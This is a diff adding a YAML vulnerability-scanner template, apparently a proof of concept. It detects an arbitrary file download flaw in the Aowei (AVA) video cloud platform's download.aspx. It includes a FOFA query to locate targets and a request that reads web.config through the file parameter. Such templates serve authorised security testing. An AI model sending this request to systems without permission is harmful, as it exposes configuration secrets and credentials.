@@ -1,0 +1,15 @@
+id: poc-yaml-ao-wei-ya-video-cloud-platform-download-aspx-anyfile-read
+info:
+  name: 奥威亚视频云平台 download.aspx 任意文件下载漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 奥威亚视频云
+  fofa: app="AVA-教学视频应用云平台"
+requests:
+- method: GET
+  path: /download.aspx?file=/web.config
+  expression: status_code == 200 && contains(body,"<configuration>") && contains(body,"<system.webServer>")
+    && contains(body,"xml")
+variables: {}
+transport: http
